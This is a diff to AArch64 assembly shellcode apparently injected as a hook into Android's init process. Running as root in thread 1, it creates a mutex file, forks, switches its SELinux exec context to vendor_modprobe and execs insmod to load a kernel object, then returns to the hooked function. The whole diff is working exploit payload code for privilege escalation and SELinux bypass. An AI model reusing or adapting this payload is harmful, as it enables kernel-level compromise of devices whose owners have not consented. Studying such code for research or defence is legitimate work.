@@ -3,7 +3,6 @@
     .include "include.inc"
 
     .global libcxx_start
-    .global libcxx_filename
     .global libcxx_data
     .global libcxx_len
     .global libcxx_first_inst_copy
@@ -12,8 +11,7 @@
 
 libcxx_data:
 
-libcxx_filename:
-L_filename:
+mutex_file:
     .asciz "/dev/df"
 selinux_ctx:
     .asciz "u:r:vendor_modprobe:s0"
@@ -21,9 +19,24 @@ selinux_ctx_end:
 attr_exec:
     .asciz "/proc/self/attr/exec"
 exe_path:
-    .asciz "/vendor/bin/modprobe"
+    .asciz "/vendor/bin/insmod"
+ko_target:
+    .ascii "/vendor/lib64/libbinderdebug.so\0"
+    .skip 32, 0                             /* pad to 64 bytes — longest candidate path */
+param_soft_reboot:
+    .asciz "soft_reboot=1"
 
     .balign 4
+    .global libcxx_ko_target_off
+libcxx_ko_target_off:
+    .int ko_target - libcxx_data
+    .global libcxx_soft_reboot_off
+libcxx_soft_reboot_off:
+    .int soft_reboot_flag - libcxx_data
+soft_reboot_flag:
+    .byte 0
+
+    .align 4
 
 libcxx_start:
     stp x0, x1, [sp, #-16]!
@@ -38,24 +51,20 @@ libcxx_start:
     // Detect root uid = 0
     mov     x8, SYS_getuid
     svc     0
-
     cbnz    w0, return
 
     // Detect init tid = 1
-    // We need in thread 1 to use default ns
+    // We need thread 1 to use the default namespace
     mov     x8, SYS_gettid
     svc     0
-
     cmp     w0, 1
     bne     return
 
     // To avoid later call of hook to execute payload, create file as mutex.
-    /* call openat(0, filename, O_CREAT|O_EXCL, 0) */
+    // Mutex: openat(AT_FDCWD, "/dev/df", O_CREAT|O_EXCL|O_CLOEXEC, 0)
     mov     x0, -100
-    // Must pass L_filename. If put libcxx_filename, address is not determined until link time.
-    adr     x1, L_filename
-    // O_CREAT|O_EXCL|O_CLOEXEC
-    movl     x2, 524480
+    adr     x1, mutex_file
+    movl    x2, (O_CREAT|O_EXCL|O_CLOEXEC)
     mov     x3, xzr
     mov     x8, #SYS_openat
     svc     0
@@ -77,47 +86,69 @@ libcxx_start:
     add     x4, sp, 8           // ctid
     mov     x3, xzr              // newtls
     mov     x2, xzr              // ptid
-    mov     x1, xzr // stack
+    mov     x1, xzr              // stack
     movl    x0, (CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD)
     svc     0
     str     w0, [sp, 8]         // save id
-
     add     sp, sp, 16
 
-    // returned tid on parent, zero on child
-    cbnz    w0, return
+    cbnz    w0, return          // parent returns to init
 
+    // ── worker child ──────────────────────────────────────────────────────
+    sub     sp, sp, 32
+
+    // Fork grandchild: set SELinux exec context → execve insmod
+    mov     x0, #SIGCHLD
+    mov     x1, xzr
+    mov     x2, xzr
+    mov     x3, xzr
+    mov     x4, xzr
+    mov     x8, #SYS_clone
+    svc     0
+    str     w0, [sp, 24]
+    cbnz    w0, myexit
+
+    // ── grandchild: insmod the KO as vendor_modprobe ──────────────────────
     // open /proc/self/attr/exec
     mov     x0, -100
     adr     x1, attr_exec
-    // O_WRONLY|O_CLOEXEC
-    movl    x2, 524289
+    movl    x2, (O_WRONLY|O_CLOEXEC)
     mov     x8, #SYS_openat
     svc     0
-    // x0 = fd
-    // write selinux_ctx
-    adr x1, selinux_ctx
-    mov x2, selinux_ctx_end - selinux_ctx
-    mov x8, #SYS_write
-    svc 0
-    // execute
+    adr     x1, selinux_ctx
+    mov     x2, selinux_ctx_end - selinux_ctx
+    mov     x8, #SYS_write
+    svc     0
 
+    // execve("/vendor/bin/insmod", [exe_path, ko_target, ["soft_reboot=1",] NULL], NULL)
+    adr     x1, exe_path
+    str     x1, [sp]
+    adr     x1, ko_target
+    str     x1, [sp, 8]
+    adr     x9, soft_reboot_flag
+    ldrb    w9, [x9]
+    cbz     w9, insmod_no_sr
+    adr     x1, param_soft_reboot
+    str     x1, [sp, 16]
+    str     xzr, [sp, 24]
+    b       do_insmod
+insmod_no_sr:
+    str     xzr, [sp, 16]
+do_insmod:
     adr     x0, exe_path
-    sub sp, sp, 16
-    adr x1,exe_path
-    str x1,[sp]
-    str xzr,[sp,8]
-    mov x1,sp
+    mov     x1, sp
     mov     x2, xzr
     mov     x8, #SYS_execve
     svc     0
 
+    b       myexit
 
-my_loop:
-    b my_loop
+myexit:
+    mov     x0, #1
+    mov     x8, #SYS_exit
+    svc     0
 
 return:
-
     ldr x30, [sp], #16
     ldp x28, x29, [sp], #16
     ldp x26, x27, [sp], #16
@@ -126,11 +157,8 @@ return:
     ldp x4, x5, [sp], #16
     ldp x2, x3, [sp], #16
     ldp x0, x1, [sp], #16
-
-    // First instruction of original function.
 libcxx_first_inst_copy:
     stp     x29, x30, [sp, #-32]!
-    // Back to original
     b       end
 end:
 
